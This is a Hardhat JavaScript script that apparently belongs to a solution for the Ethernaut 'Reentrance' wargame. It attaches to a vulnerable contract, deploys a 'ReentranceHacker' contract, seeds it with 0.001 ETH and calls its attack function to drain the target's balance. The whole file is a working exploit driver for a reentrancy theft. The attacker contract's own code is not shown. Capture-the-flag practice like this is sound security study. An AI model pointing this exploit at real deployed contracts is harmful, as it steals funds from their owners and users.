const {ethers} = require("hardhat");
require('dotenv').config()

async function main() {
  const Reentrance = await ethers.getContractFactory("Reentrance");
  console.log(`reentrance env: ${process.env.REENTRANCE_ADDR}`);
  const reentrance = Reentrance.attach(process.env.REENTRANCE_ADDR);
  console.log(`reentrance address: ${reentrance.address}`);
  const balance = await ethers.provider.getBalance(reentrance.address);
  console.log(`reentrance balance: ${ethers.utils.formatEther(balance)} ETH`);

  const initValue = ethers.utils.parseEther('0.001');
  const ReentranceHacker = await ethers.getContractFactory("ReentranceHacker");
  const reentrance_hacker = await ReentranceHacker.deploy(reentrance.address, initValue);
  await reentrance_hacker.deployed();
  console.log(`reentrance_hacker: ${reentrance_hacker.address}`);
  let tx = await reentrance.donate(reentrance_hacker.address, {
    value: initValue,
  });
  await tx.wait();
  tx = await reentrance_hacker.attack();
  await tx.wait();
  console.log(`reentrance balance: ${await ethers.provider.getBalance(reentrance.address)}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
